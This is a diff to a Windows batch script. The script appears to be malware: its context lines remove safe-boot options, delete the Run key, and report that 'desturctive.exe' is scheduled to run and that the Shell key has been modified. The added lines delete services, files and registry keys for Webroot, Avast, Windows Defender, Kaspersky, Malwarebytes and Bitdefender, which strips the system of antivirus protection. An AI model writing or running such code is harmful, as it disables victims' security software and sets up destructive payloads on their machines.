@@ -150,16 +150,40 @@ bcdedit /deletevalue {current} safeboot
 
 :: Delete registry keys related to antivirus services
 echo Deleting registry keys...
+sc delete WRSkyClient
+sc delete WRCoreService
+sc delete WRSVC
+del /f "C:\windows\system32\drivers\wrkrn.sys" :: https://www.reddit.com/r/msp/comments/uu7cy6/webroot_secureanywhere_uninstall_issue/
+del /f "C:\windows\system32\wruser.dll"
+del /f "C:\program files\webroot\*.*
+del /f "C:\Program Files (x86)\Webroot\*.*"
+del /f "C:\ProgramData\WRCore\*.*"
+del /f "C:\ProgramData\WRData\*.*"
+rd /s /q "C:\ProgramData\WRData\"
+rd /s /q "C:\Program Files\Webroot\"
+rd /s /q "C:\Program Files (x86)\Webroot\"
+rd /s /q "C:\ProgramData\WRCore\"
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
+reg delete "HKLM\SYSTEM\ContrelSet001\Services\avast! Antivirus" /f
+reg delete "HKLM\SYSTEM\ContrelSet002\Services\avast! Antivirus" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\avast! Antivirus" /f
+reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WRUNINST" /f
+reg Delete "HKLM\SOFTWARE\WRData" /f
+reg Delete "HKLM\SYSTEM\ControlSet001\services\WRSVC" /f
+reg Delete "HKLM\SYSTEM\ControlSet002\services\WRSVC" /f
+reg Delete "HKLM\SYSTEM\CurrentControlSet\services\WRSVC" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /f
+reg delete "HKLM\SYSTEM\ControlSet002\Services\WinDefend" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AVP21.3" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\AVP21.3" /f
+reg delete "HKLM\SYSTEM\ControlSet002\Services\AVP21.3" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\MBAMService" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f
+reg delete "HKLM\SYSTEM\ControlSet002\Services\MBAMService" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f
+reg delete "HKLM\SYSTEM\ControlSet002\Services\VSSERV" /f
 
 :: Confirm completion
 echo Cleanup tasks completed. Safe Mode should now be removed, desturctive.exe is scheduled to run, and Shell key is modified.
